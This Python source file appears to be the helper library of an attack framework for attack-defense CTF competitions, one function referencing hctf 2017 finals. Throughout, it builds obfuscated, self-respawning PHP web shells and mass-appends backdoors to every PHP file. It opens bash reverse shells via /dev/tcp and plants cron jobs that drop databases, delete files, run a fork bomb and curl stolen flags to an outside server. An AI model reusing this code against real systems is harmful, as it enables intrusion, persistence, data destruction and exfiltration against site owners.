#!/usr/bin/env python

from http import http
from config import *
import hashlib
import base64
from string import maketrans
import requests
from urllib import quote
import readline
import utils.log
from random import randint
import time

Log = utils.log.Log() 
user_agents = open('data/ua.data').readlines()

def rot13(text):
    rot13trans = maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
    return text.translate(rot13trans)

def write_sys_log(msg):
    sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
    open(sys_log,'a').write(sys_time + "  " + msg+'\n')

def write_specific_log(target,target_port,msg):
    sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
    open(specific_status_log + target + ":" + target_port,'a').write(sys_time + "  " + msg + '\n')

def record_status(status):
    sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
    res = sys_time + "\n" + status + '\n'
    open(status_list,'w').write(res)
    dump_info("Targets status:")
    print res

def dump_error(e,target="",load_script=""):
    if not target and not load_script:
        return Log.error(str(e))
    msg = "[error] fail to attack: " + target + " with error: " + str(e) \
    + " with the script: " + load_script
    Log.error(msg)
    write_sys_log(msg)

def dump_warning(e,target="",load_script=""):
    if not target and not load_script:
        return Log.warning(str(e))
    msg = "[warning] fail to attack: " + target + " with error: " + str(e) \
    + " with the script: " + load_script
    Log.warning(msg)
    write_sys_log(msg)

def dump_success(info,target="",load_script=""):
    if not target and not load_script:
        return Log.success(str(info))
    msg = "[success] success to " + info + " from " + target + " with the script:"\
    + load_script
    Log.success(msg)
    write_sys_log(msg)

def dump_context(info,target="",load_script=""):
    if not target and not load_script:
        return Log.context(str(info))
    msg = "[context] success to " + info + " from " + target + " with the script:"\
    + load_script
    Log.context(msg)
    # avoid too much output
    #write_sys_log(msg)
    
def dump_info(info,target="",load_script=""):
    if not target and not load_script:
        return Log.info(str(info))
    msg = "[info] success to " + info + " from " + target + " with the script:"\
    + load_script
    Log.info(msg)
    write_sys_log(msg)

def debug_print(msg):
    if debug:
        Log.context(msg) 
   
def res_filter(res):
    index_1 = res.find(cmd_prefix) + len(cmd_prefix)
    index_2 = res.find(cmd_postfix)
    if index_1 >=0 and index_2 >=0:
        res = res[index_1:index_2]
    else:
        dump_warning("can not find the cmd_split in your output")
        return "\nerror happen\n"
    return res

def random_ua():
    global headers
    length = len(user_agents)
    rand = randint(0,length-1)
    return user_agents[rand].strip("\n")

def shell_hash(target,target_port):
    shell_name = "." + hashlib.md5(shell_salt + target + ":" + target_port).hexdigest() + ".php"
    shell_arg = hashlib.md5(shell_salt_2 + target + ":" + target_port).hexdigest()
    return shell_name,shell_arg

def execute_shell(target,target_port,cmd):
    shell_name,shell_arg = shell_hash(target,target_port)
    if shell_type==1 or shell_type==2:
        c_1 = "system"
        c_2 = cmd + ";"
        c_1 = rot13(base64.b64encode(c_1))
        c_2 = rot13(base64.b64encode(c_2))
        c_1 = c_1.replace('+','%2B')
        c_2 = c_2.replace('+','%2B')
        data = "a=" + c_1 + "&" + "b=" + c_2 + "&" + "hash=" + shell_arg
        debug_print("payload => " + data)
        try:
            res = http("post",target,target_port,shell_path + "/" +  shell_name ,data,headers)
        except Exception,e:
            dump_error(e,target,"function.py execute_shell")
            # execute shell timeout
            if 'timed out' in str(e):
                return "timeout"
            return "error occurs"
        return res

def check_shell(target,target_port,cmd):
    shell_name,shell_arg = shell_hash(target,target_port)
    res = execute_shell(target,target_port,"echo hell0W0r1d")
    if res == 'timeout':
        return res
    if "hell0W0r1d" in res:
        return True
    return False    

def visit_shell(target,target_port,cmd):
    shell_name,shell_arg = shell_hash(target,target_port)
    if headers.has_key('Content-Length'):
        del(headers['Content-Length'])
    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=timeout,headers=headers)
    if res.status_code==200:
        res.close()
        return True
    res.close()
    return False

def visit_url(target,target_port,url):
    if headers.has_key('Content-Length'):
        del(headers['Content-Length'])
    res = requests.get("http://" + target + ":" + str(target_port) + url,timeout=timeout,headers=headers)
    if res.status_code==200:
        res.close()
        return True
    res.close()
    return False

def upload_and_execute(target,target_port,cmd):
    global U_A_E_flag, upload_file_name, executor
    if not U_A_E_flag:
        upload_file_name = raw_input('The file to upload:')
        executor = raw_input('The executor:')
        U_A_E_flag = 1
    contents = open("./script/" + upload_file_name).read()
    contents = base64.b64encode(contents)
    cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/cat > %s/%s'%(contents , shell_absolute_path , upload_file_name)
    cmd += ';' + executor
    debug_print(cmd)
    return cmd

def generate_shell(target,target_port,cmd,shell_type=2):
    shell_name,shell_arg = shell_hash(target,target_port)
    if shell_type==1: 
        shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
    if shell_type==2:
        shell = """<?php
        ignore_user_abort(true);
        set_time_limit(0);
        $file = "%s";
        $shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>';
        unlink(__FILE__);
        while (TRUE) {{
        if (file_get_contents($file)!==$shell) {{ file_put_contents($file, $shell); }}
        usleep(5);
        }}
        ?>"""%(shell_name,shell_arg)
    return shell_name,shell,base64.b64encode(shell)

def get_shell(target,target_port,cmd):
    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd)
    return  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 

def get_flag(target,target_port,cmd):
    return "/bin/cat " + flag_path

def get_flag_2(target,target_port,cmd):
    return "/usr/bin/curl " + get_flag_url

def test_vul(target,target_port,cmd):
    return "/bin/echo hell0W0r1d"

def rm_file_index(target,target_port,cmd):
    return "/bin/rm " + " -rf %s"%rm_index

def rm_file(target,target_port,cmd):
    return "/bin/rm " + " -rf %s"%rm_paths

def rm_db(target,target_port,cmd):
    cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
    for db in db_name:
        cmd += "drop database %s;"%db
    cmd += "'"
    debug_print(cmd)
    return cmd  
        
def mysql_get_shell(target,target_port,cmd):
    # We use the normal shell, which can not be deleted by the defalut user
    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type=1)
    # To modify the quote in the shell
    shell = shell.replace('"','\\"')
    cmd = "/usr/bin/mysql -h localhost -u%s %s -e 'select \"%s\" into outfile \"%s/%s\"' "%(db_user,my_db_passwd,shell,shell_absolute_path,shell_name)
    debug_print(cmd)
    return cmd

def reverse_shell(target,target_port,cmd):
    cmd = '/bin/bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
    cmd = base64.b64encode(cmd)
    cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/bash'%cmd
    debug_print(cmd)
    return cmd

def crontab_rm_db(target,target_port,cmd):
    cmd = rm_db(target,target_port,cmd)
    crontab_cmd = '* * * * * bash -c "%s"\n'%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd 

def crontab_reverse(target,target_port,cmd):
    cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
    crontab_cmd = "* * * * * bash -c '%s'\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd 

def crontab_rm(target,target_port,cmd):
    cmd = '/bin/rm -rf %s'%rm_paths
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd

def crontab_shellbomb(target,target_port,cmd):
    cmd = "/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;"
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat > " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd

def crontab_flag_ip(target,target_port,cmd):
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s"' %(flag_server,flag_port,flag_url,flag_token)
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd

def crontab_flag_submit(target,target_port,cmd):
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)"' %(flag_server,flag_port,flag_url,flag_token,flag_path)
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd

def crontab_flag_remote(target,target_port,cmd):
    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/usr/bin/curl %s)"' %(flag_server,flag_port,flag_url,flag_token,get_flag_url)
    crontab_cmd = "* * * * * %s\n"%cmd
    encode_crontab_cmd = base64.b64encode(crontab_cmd)
    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
    debug_print(cmd)
    return cmd

def crontab_clean(target,target_port,cmd):
    cmd = "/bin/rm " + crontab_path  + "/tmp.conf;/usr/bin/crontab -r"
    debug_print(cmd)
    return cmd
    
def batch_backdoor(target,target_port,cmd):
    shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,1)
    # We use the bash script to add the batch backdoor, because we add the bd at the end of the file, we'd better add the ?> with it
    cmd = 'function read_dir(){ for file in `ls $1`;do if [ -d $1"/"$file ];then read_dir $1"/"$file;else echo $1"/"$file;fi;done };read_dir %s | grep .php | xargs sed -i \'$a\%s\''%(web_path,"?>" + shell)
    print cmd
    cmd = base64.b64encode(cmd)
    cmd = "/bin/echo %s | /usr/bin/base64 -d | /bin/bash"%cmd
    debug_print(cmd)
    return cmd

# This function is designed for hctf 2017 finals
def change_password(target,target_port,cmd):
    my_password = "haozigege" 
    my_hash =  hashlib.sha512(my_password).hexdigest()
    debug_print(my_hash)
    php_content = "<?php $ww = '%s';?>"%my_hash 
    php_content_base64 = base64.b64encode(php_content)
    cmd = "/bin/echo %s | /usr/bin/base64 -d | cat > /var/www/html/data/settings/pass.php"%php_content_base64
    debug_print(cmd)
    return cmd


